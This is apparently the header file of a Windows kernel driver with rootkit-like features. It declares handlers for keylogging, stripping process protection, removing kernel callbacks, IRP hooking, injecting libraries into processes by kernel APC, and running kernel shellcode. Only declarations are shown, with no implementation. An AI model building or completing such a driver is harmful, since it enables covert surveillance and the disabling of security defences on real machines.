#pragma once

#include "ModuleFinder.h"
#include "RemoveProtections.h"
#include "Keylogging.h"
#include "IrpHook.h"


/*
	Globals used in the project
*/
struct Globals {
	// Apc rundown protection
	EX_RUNDOWN_REF ApcRundownProtection;

	// Global data relating to networking UM process
	struct _NetworkingProcess {
		Ppl::ProcessProtectionPolicy PrevProtectionLevel;
		HANDLE Pid;
		bool FoundFirstThread;
	} Network;

	// Cached offsets/addresses of undocumented structues
	// and functions
	struct _CachedOffsets {
		ULONG PsProtectionOffset;
		POBJECT_TYPE IoDriverObjectType;
	} CachedOffsets;

	IrpHookManager* HookManager;

	Protections::ProtectionRemover* ProtectionRemover;

	Keylogger* Keylogger;

	ModuleFinder* ModuleFinder;
};

extern Globals g_Globals;

/*
	Function declerations
*/

void DriverUnload(PDRIVER_OBJECT);

NTSTATUS IoctlDispatch(PDEVICE_OBJECT, PIRP);

NTSTATUS HandleCopyToMemory(PIRP, PIO_STACK_LOCATION);

NTSTATUS HandleStartKeylogging(PIRP Irp);

NTSTATUS HandleQueryKeylogging(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation);

NTSTATUS HandleEndKeylogging(PIRP Irp);

NTSTATUS HandleRemoveCallacks(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation);

NTSTATUS HandleInjectLibraryToProcess(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation);

NTSTATUS HandleRunKmShellcode(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation);

NTSTATUS HandleRemoveProtection(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation);

NTSTATUS HandleRestoreProtection(PIRP, PIO_STACK_LOCATION);

NTSTATUS DefaultDispatch(PDEVICE_OBJECT, PIRP);

NTSTATUS CreateClose(PDEVICE_OBJECT, PIRP);

NTSTATUS CompleteIrp(PIRP, NTSTATUS, ULONG_PTR);

void OnCreateProcess(HANDLE, HANDLE, BOOLEAN);

void OnCreateThread(HANDLE, HANDLE, BOOLEAN);

void InjectLibraryKernelApc(PVOID, PVOID, PVOID);

NTSTATUS CopyToReadOnlyBuffer(PVOID, const void*, SIZE_T);
